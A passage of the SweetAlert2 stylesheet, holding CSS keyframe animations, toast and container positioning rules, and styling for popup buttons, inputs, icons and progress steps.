    -webkit-transform: scale(0.95);
            transform: scale(0.95); }
  100% {
    -webkit-transform: scale(1);
            transform: scale(1); } }

@keyframes swal2-show {
  0% {
    -webkit-transform: scale(0.7);
            transform: scale(0.7); }
  45% {
    -webkit-transform: scale(1.05);
            transform: scale(1.05); }
  80% {
    -webkit-transform: scale(0.95);
            transform: scale(0.95); }
  100% {
    -webkit-transform: scale(1);
            transform: scale(1); } }

@-webkit-keyframes swal2-hide {
  0% {
    -webkit-transform: scale(1);
            transform: scale(1);
    opacity: 1; }
  100% {
    -webkit-transform: scale(0.5);
            transform: scale(0.5);
    opacity: 0; } }

@keyframes swal2-hide {
  0% {
    -webkit-transform: scale(1);
            transform: scale(1);
    opacity: 1; }
  100% {
    -webkit-transform: scale(0.5);
            transform: scale(0.5);
    opacity: 0; } }

@-webkit-keyframes swal2-animate-success-line-tip {
  0% {
    top: 1.1875em;
    left: .0625em;
    width: 0; }
  54% {
    top: 1.0625em;
    left: .125em;
    width: 0; }
  70% {
    top: 2.1875em;
    left: -.375em;
    width: 3.125em; }
  84% {
    top: 3em;
    left: 1.3125em;
    width: 1.0625em; }
  100% {
    top: 2.8125em;
    left: .875em;
    width: 1.5625em; } }

@keyframes swal2-animate-success-line-tip {
  0% {
    top: 1.1875em;
    left: .0625em;
    width: 0; }
  54% {
    top: 1.0625em;
    left: .125em;
    width: 0; }
  70% {
    top: 2.1875em;
    left: -.375em;
    width: 3.125em; }
  84% {
    top: 3em;
    left: 1.3125em;
    width: 1.0625em; }
  100% {
    top: 2.8125em;
    left: .875em;
    width: 1.5625em; } }

@-webkit-keyframes swal2-animate-success-line-long {
  0% {
    top: 3.375em;
    right: 2.875em;
    width: 0; }
  65% {
    top: 3.375em;
    right: 2.875em;
    width: 0; }
  84% {
    top: 2.1875em;
    right: 0;
    width: 3.4375em; }
  100% {
    top: 2.375em;
    right: .5em;
    width: 2.9375em; } }

@keyframes swal2-animate-success-line-long {
  0% {
    top: 3.375em;
    right: 2.875em;
    width: 0; }
  65% {
    top: 3.375em;
    right: 2.875em;
    width: 0; }
  84% {
    top: 2.1875em;
    right: 0;
    width: 3.4375em; }
  100% {
    top: 2.375em;
    right: .5em;
    width: 2.9375em; } }

@-webkit-keyframes swal2-rotate-success-circular-line {
  0% {
    -webkit-transform: rotate(-45deg);
            transform: rotate(-45deg); }
  5% {
    -webkit-transform: rotate(-45deg);
            transform: rotate(-45deg); }
  12% {
    -webkit-transform: rotate(-405deg);
            transform: rotate(-405deg); }
  100% {
    -webkit-transform: rotate(-405deg);
            transform: rotate(-405deg); } }

@keyframes swal2-rotate-success-circular-line {
  0% {
    -webkit-transform: rotate(-45deg);
            transform: rotate(-45deg); }
  5% {
    -webkit-transform: rotate(-45deg);
            transform: rotate(-45deg); }
  12% {
    -webkit-transform: rotate(-405deg);
            transform: rotate(-405deg); }
  100% {
    -webkit-transform: rotate(-405deg);
            transform: rotate(-405deg); } }

@-webkit-keyframes swal2-animate-error-x-mark {
  0% {
    margin-top: 1.625em;
    -webkit-transform: scale(0.4);
            transform: scale(0.4);
    opacity: 0; }
  50% {
    margin-top: 1.625em;
    -webkit-transform: scale(0.4);
            transform: scale(0.4);
    opacity: 0; }
  80% {
    margin-top: -.375em;
    -webkit-transform: scale(1.15);
            transform: scale(1.15); }
  100% {
    margin-top: 0;
    -webkit-transform: scale(1);
            transform: scale(1);
    opacity: 1; } }

@keyframes swal2-animate-error-x-mark {
  0% {
    margin-top: 1.625em;
    -webkit-transform: scale(0.4);
            transform: scale(0.4);
    opacity: 0; }
  50% {
    margin-top: 1.625em;
    -webkit-transform: scale(0.4);
            transform: scale(0.4);
    opacity: 0; }
  80% {
    margin-top: -.375em;
    -webkit-transform: scale(1.15);
            transform: scale(1.15); }
  100% {
    margin-top: 0;
    -webkit-transform: scale(1);
            transform: scale(1);
    opacity: 1; } }

@-webkit-keyframes swal2-animate-error-icon {
  0% {
    -webkit-transform: rotateX(100deg);
            transform: rotateX(100deg);
    opacity: 0; }
  100% {
    -webkit-transform: rotateX(0deg);
            transform: rotateX(0deg);
    opacity: 1; } }

@keyframes swal2-animate-error-icon {
  0% {
    -webkit-transform: rotateX(100deg);
            transform: rotateX(100deg);
    opacity: 0; }
  100% {
    -webkit-transform: rotateX(0deg);
            transform: rotateX(0deg);
    opacity: 1; } }

body.swal2-toast-shown.swal2-has-input > .swal2-container > .swal2-toast {
  flex-direction: column;
  align-items: stretch; }
  body.swal2-toast-shown.swal2-has-input > .swal2-container > .swal2-toast .swal2-actions {
    flex: 1;
    align-self: stretch;
    justify-content: flex-end;
    height: 2.2em; }
  body.swal2-toast-shown.swal2-has-input > .swal2-container > .swal2-toast .swal2-loading {
    justify-content: center; }
  body.swal2-toast-shown.swal2-has-input > .swal2-container > .swal2-toast .swal2-input {
    height: 2em;
    margin: .3125em auto;
    font-size: 1em; }
  body.swal2-toast-shown.swal2-has-input > .swal2-container > .swal2-toast .swal2-validationerror {
    font-size: 1em; }

body.swal2-toast-shown > .swal2-container {
  position: fixed;
  background-color: transparent; }
  body.swal2-toast-shown > .swal2-container.swal2-shown {
    background-color: transparent; }
  body.swal2-toast-shown > .swal2-container.swal2-top {
    top: 0;
    right: auto;
    bottom: auto;
    left: 50%;
    -webkit-transform: translateX(-50%);
            transform: translateX(-50%); }
  body.swal2-toast-shown > .swal2-container.swal2-top-end, body.swal2-toast-shown > .swal2-container.swal2-top-right {
    top: 0;
    right: 0;
    bottom: auto;
    left: auto; }
  body.swal2-toast-shown > .swal2-container.swal2-top-start, body.swal2-toast-shown > .swal2-container.swal2-top-left {
    top: 0;
    right: auto;
    bottom: auto;
    left: 0; }
  body.swal2-toast-shown > .swal2-container.swal2-center-start, body.swal2-toast-shown > .swal2-container.swal2-center-left {
    top: 50%;
    right: auto;
    bottom: auto;
    left: 0;
    -webkit-transform: translateY(-50%);
            transform: translateY(-50%); }
  body.swal2-toast-shown > .swal2-container.swal2-center {
    top: 50%;
    right: auto;
    bottom: auto;
    left: 50%;
    -webkit-transform: translate(-50%, -50%);
            transform: translate(-50%, -50%); }
  body.swal2-toast-shown > .swal2-container.swal2-center-end, body.swal2-toast-shown > .swal2-container.swal2-center-right {
    top: 50%;
    right: 0;
    bottom: auto;
    left: auto;
    -webkit-transform: translateY(-50%);
            transform: translateY(-50%); }
  body.swal2-toast-shown > .swal2-container.swal2-bottom-start, body.swal2-toast-shown > .swal2-container.swal2-bottom-left {
    top: auto;
    right: auto;
    bottom: 0;
    left: 0; }
  body.swal2-toast-shown > .swal2-container.swal2-bottom {
    top: auto;
    right: auto;
    bottom: 0;
    left: 50%;
    -webkit-transform: translateX(-50%);
            transform: translateX(-50%); }
  body.swal2-toast-shown > .swal2-container.swal2-bottom-end, body.swal2-toast-shown > .swal2-container.swal2-bottom-right {
    top: auto;
    right: 0;
    bottom: 0;
    left: auto; }

.swal2-popup.swal2-toast {
  flex-direction: row;
  align-items: center;
  width: auto;
  padding: 0.625em;
  box-shadow: 0 0 0.625em #d9d9d9;
  overflow-y: hidden; }
  .swal2-popup.swal2-toast .swal2-header {
    flex-direction: row; }
  .swal2-popup.swal2-toast .swal2-title {
    justify-content: flex-start;
    margin: 0 .6em;
    font-size: 1em; }
  .swal2-popup.swal2-toast .swal2-close {
    position: initial; }
  .swal2-popup.swal2-toast .swal2-content {
    justify-content: flex-start;
    font-size: 1em; }
  .swal2-popup.swal2-toast .swal2-icon {
    width: 2em;
    min-width: 2em;
    height: 2em;
    margin: 0; }
    .swal2-popup.swal2-toast .swal2-icon-text {
      font-size: 2em;
      font-weight: bold;
      line-height: 1em; }
    .swal2-popup.swal2-toast .swal2-icon.swal2-success .swal2-success-ring {
      width: 2em;
      height: 2em; }
    .swal2-popup.swal2-toast .swal2-icon.swal2-error [class^='swal2-x-mark-line'] {
      top: .875em;
      width: 1.375em; }
      .swal2-popup.swal2-toast .swal2-icon.swal2-error [class^='swal2-x-mark-line'][class$='left'] {
        left: .3125em; }
      .swal2-popup.swal2-toast .swal2-icon.swal2-error [class^='swal2-x-mark-line'][class$='right'] {
        right: .3125em; }
  .swal2-popup.swal2-toast .swal2-actions {
    height: auto;
    margin: 0 .3125em; }
  .swal2-popup.swal2-toast .swal2-styled {
    margin: 0 .3125em;
    padding: .3125em .625em;
    font-size: 1em; }
    .swal2-popup.swal2-toast .swal2-styled:focus {
      box-shadow: 0 0 0 0.0625em #fff, 0 0 0 0.125em rgba(50, 100, 150, 0.4); }
  .swal2-popup.swal2-toast .swal2-success {
    border-color: #a5dc86; }
    .swal2-popup.swal2-toast .swal2-success [class^='swal2-success-circular-line'] {
      position: absolute;
      width: 2em;
      height: 2.8125em;
      -webkit-transform: rotate(45deg);
              transform: rotate(45deg);
      border-radius: 50%; }
      .swal2-popup.swal2-toast .swal2-success [class^='swal2-success-circular-line'][class$='left'] {
        top: -.25em;
        left: -.9375em;
        -webkit-transform: rotate(-45deg);
                transform: rotate(-45deg);
        -webkit-transform-origin: 2em 2em;
                transform-origin: 2em 2em;
        border-radius: 4em 0 0 4em; }
      .swal2-popup.swal2-toast .swal2-success [class^='swal2-success-circular-line'][class$='right'] {
        top: -.25em;
        left: .9375em;
        -webkit-transform-origin: 0 2em;
                transform-origin: 0 2em;
        border-radius: 0 4em 4em 0; }
    .swal2-popup.swal2-toast .swal2-success .swal2-success-ring {
      width: 2em;
      height: 2em; }
    .swal2-popup.swal2-toast .swal2-success .swal2-success-fix {
      top: 0;
      left: .4375em;
      width: .4375em;
      height: 2.6875em; }
    .swal2-popup.swal2-toast .swal2-success [class^='swal2-success-line'] {
      height: .3125em; }
      .swal2-popup.swal2-toast .swal2-success [class^='swal2-success-line'][class$='tip'] {
        top: 1.125em;
        left: .1875em;
        width: .75em; }
      .swal2-popup.swal2-toast .swal2-success [class^='swal2-success-line'][class$='long'] {
        top: .9375em;
        right: .1875em;
        width: 1.375em; }
  .swal2-popup.swal2-toast.swal2-show {
    -webkit-animation: showSweetToast .5s;
            animation: showSweetToast .5s; }
  .swal2-popup.swal2-toast.swal2-hide {
    -webkit-animation: hideSweetToast .2s forwards;
            animation: hideSweetToast .2s forwards; }
  .swal2-popup.swal2-toast .swal2-animate-success-icon .swal2-success-line-tip {
    -webkit-animation: animate-toast-success-tip .75s;
            animation: animate-toast-success-tip .75s; }
  .swal2-popup.swal2-toast .swal2-animate-success-icon .swal2-success-line-long {
    -webkit-animation: animate-toast-success-long .75s;
            animation: animate-toast-success-long .75s; }

@-webkit-keyframes showSweetToast {
  0% {
    -webkit-transform: translateY(-0.625em) rotateZ(2deg);
            transform: translateY(-0.625em) rotateZ(2deg);
    opacity: 0; }
  33% {
    -webkit-transform: translateY(0) rotateZ(-2deg);
            transform: translateY(0) rotateZ(-2deg);
    opacity: .5; }
  66% {
    -webkit-transform: translateY(0.3125em) rotateZ(2deg);
            transform: translateY(0.3125em) rotateZ(2deg);
    opacity: .7; }
  100% {
    -webkit-transform: translateY(0) rotateZ(0);
            transform: translateY(0) rotateZ(0);
    opacity: 1; } }

@keyframes showSweetToast {
  0% {
    -webkit-transform: translateY(-0.625em) rotateZ(2deg);
            transform: translateY(-0.625em) rotateZ(2deg);
    opacity: 0; }
  33% {
    -webkit-transform: translateY(0) rotateZ(-2deg);
            transform: translateY(0) rotateZ(-2deg);
    opacity: .5; }
  66% {
    -webkit-transform: translateY(0.3125em) rotateZ(2deg);
            transform: translateY(0.3125em) rotateZ(2deg);
    opacity: .7; }
  100% {
    -webkit-transform: translateY(0) rotateZ(0);
            transform: translateY(0) rotateZ(0);
    opacity: 1; } }

@-webkit-keyframes hideSweetToast {
  0% {
    opacity: 1; }
  33% {
    opacity: .5; }
  100% {
    -webkit-transform: rotateZ(1deg);
            transform: rotateZ(1deg);
    opacity: 0; } }

@keyframes hideSweetToast {
  0% {
    opacity: 1; }
  33% {
    opacity: .5; }
  100% {
    -webkit-transform: rotateZ(1deg);
            transform: rotateZ(1deg);
    opacity: 0; } }

@-webkit-keyframes animate-toast-success-tip {
  0% {
    top: .5625em;
    left: .0625em;
    width: 0; }
  54% {
    top: .125em;
    left: .125em;
    width: 0; }
  70% {
    top: .625em;
    left: -.25em;
    width: 1.625em; }
  84% {
    top: 1.0625em;
    left: .75em;
    width: .5em; }
  100% {
    top: 1.125em;
    left: .1875em;
    width: .75em; } }

@keyframes animate-toast-success-tip {
  0% {
    top: .5625em;
    left: .0625em;
    width: 0; }
  54% {
    top: .125em;
    left: .125em;
    width: 0; }
  70% {
    top: .625em;
    left: -.25em;
    width: 1.625em; }
  84% {
    top: 1.0625em;
    left: .75em;
    width: .5em; }
  100% {
    top: 1.125em;
    left: .1875em;
    width: .75em; } }

@-webkit-keyframes animate-toast-success-long {
  0% {
    top: 1.625em;
    right: 1.375em;
    width: 0; }
  65% {
    top: 1.25em;
    right: .9375em;
    width: 0; }
  84% {
    top: .9375em;
    right: 0;
    width: 1.125em; }
  100% {
    top: .9375em;
    right: .1875em;
    width: 1.375em; } }

@keyframes animate-toast-success-long {
  0% {
    top: 1.625em;
    right: 1.375em;
    width: 0; }
  65% {
    top: 1.25em;
    right: .9375em;
    width: 0; }
  84% {
    top: .9375em;
    right: 0;
    width: 1.125em; }
  100% {
    top: .9375em;
    right: .1875em;
    width: 1.375em; } }

html.swal2-shown:not(.swal2-no-backdrop):not(.swal2-toast-shown),
body.swal2-shown:not(.swal2-no-backdrop):not(.swal2-toast-shown) {
  height: auto;
  overflow-y: hidden; }

body.swal2-no-backdrop .swal2-shown {
  top: auto;
  right: auto;
  bottom: auto;
  left: auto;
  background-color: transparent; }
  body.swal2-no-backdrop .swal2-shown > .swal2-modal {
    box-shadow: 0 0 10px rgba(0, 0, 0, 0.4); }
  body.swal2-no-backdrop .swal2-shown.swal2-top {
    top: 0;
    left: 50%;
    -webkit-transform: translateX(-50%);
            transform: translateX(-50%); }
  body.swal2-no-backdrop .swal2-shown.swal2-top-start, body.swal2-no-backdrop .swal2-shown.swal2-top-left {
    top: 0;
    left: 0; }
  body.swal2-no-backdrop .swal2-shown.swal2-top-end, body.swal2-no-backdrop .swal2-shown.swal2-top-right {
    top: 0;
    right: 0; }
  body.swal2-no-backdrop .swal2-shown.swal2-center {
    top: 50%;
    left: 50%;
    -webkit-transform: translate(-50%, -50%);
            transform: translate(-50%, -50%); }
  body.swal2-no-backdrop .swal2-shown.swal2-center-start, body.swal2-no-backdrop .swal2-shown.swal2-center-left {
    top: 50%;
    left: 0;
    -webkit-transform: translateY(-50%);
            transform: translateY(-50%); }
  body.swal2-no-backdrop .swal2-shown.swal2-center-end, body.swal2-no-backdrop .swal2-shown.swal2-center-right {
    top: 50%;
    right: 0;
    -webkit-transform: translateY(-50%);
            transform: translateY(-50%); }
  body.swal2-no-backdrop .swal2-shown.swal2-bottom {
    bottom: 0;
    left: 50%;
    -webkit-transform: translateX(-50%);
            transform: translateX(-50%); }
  body.swal2-no-backdrop .swal2-shown.swal2-bottom-start, body.swal2-no-backdrop .swal2-shown.swal2-bottom-left {
    bottom: 0;
    left: 0; }
  body.swal2-no-backdrop .swal2-shown.swal2-bottom-end, body.swal2-no-backdrop .swal2-shown.swal2-bottom-right {
    right: 0;
    bottom: 0; }

.swal2-container {
  display: flex;
  position: fixed;
  top: 0;
  right: 0;
  bottom: 0;
  left: 0;
  flex-direction: row;
  align-items: center;
  justify-content: center;
  padding: 10px;
  background-color: transparent;
  z-index: 1060;
  overflow-x: hidden;
  -webkit-overflow-scrolling: touch; }
  .swal2-container.swal2-top {
    align-items: flex-start; }
  .swal2-container.swal2-top-start, .swal2-container.swal2-top-left {
    align-items: flex-start;
    justify-content: flex-start; }
  .swal2-container.swal2-top-end, .swal2-container.swal2-top-right {
    align-items: flex-start;
    justify-content: flex-end; }
  .swal2-container.swal2-center {
    align-items: center; }
  .swal2-container.swal2-center-start, .swal2-container.swal2-center-left {
    align-items: center;
    justify-content: flex-start; }
  .swal2-container.swal2-center-end, .swal2-container.swal2-center-right {
    align-items: center;
    justify-content: flex-end; }
  .swal2-container.swal2-bottom {
    align-items: flex-end; }
  .swal2-container.swal2-bottom-start, .swal2-container.swal2-bottom-left {
    align-items: flex-end;
    justify-content: flex-start; }
  .swal2-container.swal2-bottom-end, .swal2-container.swal2-bottom-right {
    align-items: flex-end;
    justify-content: flex-end; }
  .swal2-container.swal2-grow-fullscreen > .swal2-modal {
    display: flex !important;
    flex: 1;
    align-self: stretch;
    justify-content: center; }
  .swal2-container.swal2-grow-row > .swal2-modal {
    display: flex !important;
    flex: 1;
    align-content: center;
    justify-content: center; }
  .swal2-container.swal2-grow-column {
    flex: 1;
    flex-direction: column; }
    .swal2-container.swal2-grow-column.swal2-top, .swal2-container.swal2-grow-column.swal2-center, .swal2-container.swal2-grow-column.swal2-bottom {
      align-items: center; }
    .swal2-container.swal2-grow-column.swal2-top-start, .swal2-container.swal2-grow-column.swal2-center-start, .swal2-container.swal2-grow-column.swal2-bottom-start, .swal2-container.swal2-grow-column.swal2-top-left, .swal2-container.swal2-grow-column.swal2-center-left, .swal2-container.swal2-grow-column.swal2-bottom-left {
      align-items: flex-start; }
    .swal2-container.swal2-grow-column.swal2-top-end, .swal2-container.swal2-grow-column.swal2-center-end, .swal2-container.swal2-grow-column.swal2-bottom-end, .swal2-container.swal2-grow-column.swal2-top-right, .swal2-container.swal2-grow-column.swal2-center-right, .swal2-container.swal2-grow-column.swal2-bottom-right {
      align-items: flex-end; }
    .swal2-container.swal2-grow-column > .swal2-modal {
      display: flex !important;
      flex: 1;
      align-content: center;
      justify-content: center; }
  .swal2-container:not(.swal2-top):not(.swal2-top-start):not(.swal2-top-end):not(.swal2-top-left):not(.swal2-top-right):not(.swal2-center-start):not(.swal2-center-end):not(.swal2-center-left):not(.swal2-center-right):not(.swal2-bottom):not(.swal2-bottom-start):not(.swal2-bottom-end):not(.swal2-bottom-left):not(.swal2-bottom-right) > .swal2-modal {
    margin: auto; }
  @media all and (-ms-high-contrast: none), (-ms-high-contrast: active) {
    .swal2-container .swal2-modal {
      margin: 0 !important; } }
  .swal2-container.swal2-fade {
    transition: background-color .1s; }
  .swal2-container.swal2-shown {
    background-color: rgba(0, 0, 0, 0.4); }

.swal2-popup {
  display: none;
  position: relative;
  flex-direction: column;
  justify-content: center;
  width: 32em;
  max-width: 100%;
  padding: 1.25em;
  border-radius: 0.3125em;
  background: #fff;
  font-family: inherit;
  font-size: 1rem;
  box-sizing: border-box; }
  .swal2-popup:focus {
    outline: none; }
  .swal2-popup.swal2-loading {
    overflow-y: hidden; }
  .swal2-popup .swal2-header {
    display: flex;
    flex-direction: column;
    align-items: center; }
  .swal2-popup .swal2-title {
    display: block;
    position: relative;
    max-width: 100%;
    margin: 0 0 0.4em;
    padding: 0;
    color: #595959;
    font-size: 1.875em;
    font-weight: 600;
    text-align: center;
    text-transform: none;
    word-wrap: break-word; }
  .swal2-popup .swal2-actions {
    align-items: center;
    justify-content: center;
    margin: 1.25em auto 0; }
    .swal2-popup .swal2-actions:not(.swal2-loading) .swal2-styled[disabled] {
      opacity: .4; }
    .swal2-popup .swal2-actions:not(.swal2-loading) .swal2-styled:hover {
      background-image: linear-gradient(rgba(0, 0, 0, 0.1), rgba(0, 0, 0, 0.1)); }
    .swal2-popup .swal2-actions:not(.swal2-loading) .swal2-styled:active {
      background-image: linear-gradient(rgba(0, 0, 0, 0.2), rgba(0, 0, 0, 0.2)); }
    .swal2-popup .swal2-actions.swal2-loading .swal2-styled.swal2-confirm {
      width: 2.5em;
      height: 2.5em;
      margin: .46875em;
      padding: 0;
      border: .25em solid transparent;
      border-radius: 100%;
      border-color: transparent;
      background-color: transparent !important;
      color: transparent;
      cursor: default;
      box-sizing: border-box;
      -webkit-animation: swal2-rotate-loading 1.5s linear 0s infinite normal;
              animation: swal2-rotate-loading 1.5s linear 0s infinite normal;
      -webkit-user-select: none;
         -moz-user-select: none;
          -ms-user-select: none;
              user-select: none; }
    .swal2-popup .swal2-actions.swal2-loading .swal2-styled.swal2-cancel {
      margin-right: 30px;
      margin-left: 30px; }
    .swal2-popup .swal2-actions.swal2-loading :not(.swal2-styled).swal2-confirm::after {
      display: inline-block;
      width: 15px;
      height: 15px;
      margin-left: 5px;
      border: 3px solid #999999;
      border-radius: 50%;
      border-right-color: transparent;
      box-shadow: 1px 1px 1px #fff;
      content: '';
      -webkit-animation: swal2-rotate-loading 1.5s linear 0s infinite normal;
              animation: swal2-rotate-loading 1.5s linear 0s infinite normal; }
  .swal2-popup .swal2-styled {
    margin: 0 .3125em;
    padding: .625em 2em;
    font-weight: 500;
    box-shadow: none; }
    .swal2-popup .swal2-styled:not([disabled]) {
      cursor: pointer; }
    .swal2-popup .swal2-styled.swal2-confirm {
      border: 0;
      border-radius: 0.25em;
      background-color: #3085d6;
      color: #fff;
      font-size: 1.0625em; }
    .swal2-popup .swal2-styled.swal2-cancel {
      border: 0;
      border-radius: 0.25em;
      background-color: #aaa;
      color: #fff;
      font-size: 1.0625em; }
    .swal2-popup .swal2-styled:focus {
      outline: none;
      box-shadow: 0 0 0 2px #fff, 0 0 0 4px rgba(50, 100, 150, 0.4); }
    .swal2-popup .swal2-styled::-moz-focus-inner {
      border: 0; }
  .swal2-popup .swal2-footer {
    justify-content: center;
    margin: 1.25em 0 0;
    padding-top: 1em;
    border-top: 1px solid #eee;
    color: #545454;
    font-size: 1em; }
  .swal2-popup .swal2-image {
    max-width: 100%;
    margin: 1.25em auto; }
  .swal2-popup .swal2-close {
    position: absolute;
    top: 0;
    right: 0;
    justify-content: center;
    width: 1.2em;
    min-width: 1.2em;
    height: 1.2em;
    margin: 0;
    padding: 0;
    transition: color 0.1s ease-out;
    border: none;
    border-radius: 0;
    background: transparent;
    color: #cccccc;
    font-family: serif;
    font-size: calc(2.5em - 0.25em);
    line-height: 1.2em;
    cursor: pointer; }
    .swal2-popup .swal2-close:hover {
      -webkit-transform: none;
              transform: none;
      color: #f27474; }
  .swal2-popup > .swal2-input,
  .swal2-popup > .swal2-file,
  .swal2-popup > .swal2-textarea,
  .swal2-popup > .swal2-select,
  .swal2-popup > .swal2-radio,
  .swal2-popup > .swal2-checkbox {
    display: none; }
  .swal2-popup .swal2-content {
    justify-content: center;
    margin: 0;
    padding: 0;
    color: #545454;
    font-size: 1.125em;
    font-weight: 300;
    line-height: normal;
    word-wrap: break-word; }
  .swal2-popup #swal2-content {
    text-align: center; }
  .swal2-popup .swal2-input,
  .swal2-popup .swal2-file,
  .swal2-popup .swal2-textarea,
  .swal2-popup .swal2-select,
  .swal2-popup .swal2-radio,
  .swal2-popup .swal2-checkbox {
    margin: 1em auto; }
  .swal2-popup .swal2-input,
  .swal2-popup .swal2-file,
  .swal2-popup .swal2-textarea {
    width: 100%;
    transition: border-color .3s, box-shadow .3s;
    border: 1px solid #d9d9d9;
    border-radius: 0.1875em;
    font-size: 1.125em;
    box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.06);
    box-sizing: border-box; }
    .swal2-popup .swal2-input.swal2-inputerror,
    .swal2-popup .swal2-file.swal2-inputerror,
    .swal2-popup .swal2-textarea.swal2-inputerror {
      border-color: #f27474 !important;
      box-shadow: 0 0 2px #f27474 !important; }
    .swal2-popup .swal2-input:focus,
    .swal2-popup .swal2-file:focus,
    .swal2-popup .swal2-textarea:focus {
      border: 1px solid #b4dbed;
      outline: none;
      box-shadow: 0 0 3px #c4e6f5; }
    .swal2-popup .swal2-input::-webkit-input-placeholder,
    .swal2-popup .swal2-file::-webkit-input-placeholder,
    .swal2-popup .swal2-textarea::-webkit-input-placeholder {
      color: #cccccc; }
    .swal2-popup .swal2-input:-ms-input-placeholder,
    .swal2-popup .swal2-file:-ms-input-placeholder,
    .swal2-popup .swal2-textarea:-ms-input-placeholder {
      color: #cccccc; }
    .swal2-popup .swal2-input::-ms-input-placeholder,
    .swal2-popup .swal2-file::-ms-input-placeholder,
    .swal2-popup .swal2-textarea::-ms-input-placeholder {
      color: #cccccc; }
    .swal2-popup .swal2-input::placeholder,
    .swal2-popup .swal2-file::placeholder,
    .swal2-popup .swal2-textarea::placeholder {
      color: #cccccc; }
  .swal2-popup .swal2-range input {
    width: 80%; }
  .swal2-popup .swal2-range output {
    width: 20%;
    font-weight: 600;
    text-align: center; }
  .swal2-popup .swal2-range input,
  .swal2-popup .swal2-range output {
    height: 2.625em;
    margin: 1em auto;
    padding: 0;
    font-size: 1.125em;
    line-height: 2.625em; }
  .swal2-popup .swal2-input {
    height: 2.625em;
    padding: 0.75em; }
    .swal2-popup .swal2-input[type='number'] {
      max-width: 10em; }
  .swal2-popup .swal2-file {
    font-size: 1.125em; }
  .swal2-popup .swal2-textarea {
    height: 6.75em;
    padding: 0.75em; }
  .swal2-popup .swal2-select {
    min-width: 50%;
    max-width: 100%;
    padding: .375em .625em;
    color: #545454;
    font-size: 1.125em; }
  .swal2-popup .swal2-radio,
  .swal2-popup .swal2-checkbox {
    align-items: center;
    justify-content: center; }
    .swal2-popup .swal2-radio label,
    .swal2-popup .swal2-checkbox label {
      margin: 0 .6em;
      font-size: 1.125em; }
    .swal2-popup .swal2-radio input,
    .swal2-popup .swal2-checkbox input {
      margin: 0 .4em; }
  .swal2-popup .swal2-validationerror {
    display: none;
    align-items: center;
    justify-content: center;
    padding: 0.625em;
    background: #f0f0f0;
    color: #666666;
    font-size: 1em;
    font-weight: 300;
    overflow: hidden; }
    .swal2-popup .swal2-validationerror::before {
      display: inline-block;
      width: 1.5em;
      height: 1.5em;
      margin: 0 .625em;
      border-radius: 50%;
      background-color: #f27474;
      color: #fff;
      font-weight: 600;
      line-height: 1.5em;
      text-align: center;
      content: '!';
      zoom: normal; }

@supports (-ms-accelerator: true) {
  .swal2-range input {
    width: 100% !important; }
  .swal2-range output {
    display: none; } }

@media all and (-ms-high-contrast: none), (-ms-high-contrast: active) {
  .swal2-range input {
    width: 100% !important; }
  .swal2-range output {
    display: none; } }

.swal2-icon {
  position: relative;
  justify-content: center;
  width: 5em;
  height: 5em;
  margin: 1.25em auto 1.875em;
  border: .25em solid transparent;
  border-radius: 50%;
  line-height: 5em;
  cursor: default;
  box-sizing: content-box;
  -webkit-user-select: none;
     -moz-user-select: none;
      -ms-user-select: none;
          user-select: none;
  zoom: normal; }
  .swal2-icon-text {
    font-size: 3.75em; }
  .swal2-icon.swal2-error {
    border-color: #f27474; }
    .swal2-icon.swal2-error .swal2-x-mark {
      position: relative;
      flex-grow: 1; }
    .swal2-icon.swal2-error [class^='swal2-x-mark-line'] {
      display: block;
      position: absolute;
      top: 2.3125em;
      width: 2.9375em;
      height: .3125em;
      border-radius: .125em;
      background-color: #f27474; }
      .swal2-icon.swal2-error [class^='swal2-x-mark-line'][class$='left'] {
        left: 1.0625em;
        -webkit-transform: rotate(45deg);
                transform: rotate(45deg); }
      .swal2-icon.swal2-error [class^='swal2-x-mark-line'][class$='right'] {
        right: 1em;
        -webkit-transform: rotate(-45deg);
                transform: rotate(-45deg); }
  .swal2-icon.swal2-warning {
    border-color: #facea8;
    color: #f8bb86; }
  .swal2-icon.swal2-info {
    border-color: #9de0f6;
    color: #3fc3ee; }
  .swal2-icon.swal2-question {
    border-color: #c9dae1;
    color: #87adbd; }
  .swal2-icon.swal2-success {
    border-color: #a5dc86; }
    .swal2-icon.swal2-success [class^='swal2-success-circular-line'] {
      position: absolute;
      width: 3.75em;
      height: 7.5em;
      -webkit-transform: rotate(45deg);
              transform: rotate(45deg);
      border-radius: 50%; }
      .swal2-icon.swal2-success [class^='swal2-success-circular-line'][class$='left'] {
        top: -.4375em;
        left: -2.0635em;
        -webkit-transform: rotate(-45deg);
                transform: rotate(-45deg);
        -webkit-transform-origin: 3.75em 3.75em;
                transform-origin: 3.75em 3.75em;
        border-radius: 7.5em 0 0 7.5em; }
      .swal2-icon.swal2-success [class^='swal2-success-circular-line'][class$='right'] {
        top: -.6875em;
        left: 1.875em;
        -webkit-transform: rotate(-45deg);
                transform: rotate(-45deg);
        -webkit-transform-origin: 0 3.75em;
                transform-origin: 0 3.75em;
        border-radius: 0 7.5em 7.5em 0; }
    .swal2-icon.swal2-success .swal2-success-ring {
      position: absolute;
      top: -.25em;
      left: -.25em;
      width: 100%;
      height: 100%;
      border: 0.25em solid rgba(165, 220, 134, 0.3);
      border-radius: 50%;
      z-index: 2;
      box-sizing: content-box; }
    .swal2-icon.swal2-success .swal2-success-fix {
      position: absolute;
      top: .5em;
      left: 1.625em;
      width: .4375em;
      height: 5.625em;
      -webkit-transform: rotate(-45deg);
              transform: rotate(-45deg);
      z-index: 1; }
    .swal2-icon.swal2-success [class^='swal2-success-line'] {
      display: block;
      position: absolute;
      height: .3125em;
      border-radius: .125em;
      background-color: #a5dc86;
      z-index: 2; }
      .swal2-icon.swal2-success [class^='swal2-success-line'][class$='tip'] {
        top: 2.875em;
        left: .875em;
        width: 1.5625em;
        -webkit-transform: rotate(45deg);
                transform: rotate(45deg); }
      .swal2-icon.swal2-success [class^='swal2-success-line'][class$='long'] {
        top: 2.375em;
        right: .5em;
        width: 2.9375em;
        -webkit-transform: rotate(-45deg);
                transform: rotate(-45deg); }

.swal2-progresssteps {
  align-items: center;
  margin: 0 0 1.25em;
  padding: 0;
  font-weight: 600; }
  .swal2-progresssteps li {
    display: inline-block;
    position: relative; }
  .swal2-progresssteps .swal2-progresscircle {
    width: 2em;
    height: 2em;
    border-radius: 2em;
    background: #3085d6;
    color: #fff;
    line-height: 2em;
    text-align: center;
    z-index: 20; }
    .swal2-progresssteps .swal2-progresscircle:first-child {
      margin-left: 0; }
    .swal2-progresssteps .swal2-progresscircle:last-child {
      margin-right: 0; }
    .swal2-progresssteps .swal2-progresscircle.swal2-activeprogressstep {
      background: #3085d6; }
